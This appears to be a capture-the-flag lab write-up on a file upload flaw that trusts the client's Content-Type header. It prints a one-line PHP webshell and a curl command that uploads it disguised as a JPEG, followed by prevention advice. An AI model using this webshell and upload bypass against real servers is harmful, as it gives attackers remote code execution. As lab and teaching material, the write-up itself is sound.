# File Upload - MIME Type Bypass

## Vulnerability
The file upload only checks the `Content-Type` header sent by the client, not the actual file content.

## Exploitation
1. Navigate to `?page=upload`
2. Create a PHP webshell: `<?php system($_GET['cmd']); ?>`
3. Upload it while spoofing the MIME type with curl:

``` bash
echo '<?php system($_GET["cmd"]); ?>' > image.php
```

```bash
curl -X POST http://172.16.60.128/?page=upload \
  -F "Upload=Upload" \
  -F "uploaded=@image.php;type=image/jpeg"
```

4. Server accepts the file (trusting the Content-Type header) and reveals the flag

## Impact
An attacker can upload a PHP webshell and achieve Remote Code Execution (RCE), gaining full server control.

## Prevention
- Validate file content using magic bytes, not just Content-Type
- Use a strict whitelist of allowed extensions
- Rename uploaded files and strip executable extensions
- Store uploads outside the web root
- Disable execution of scripts in upload directories

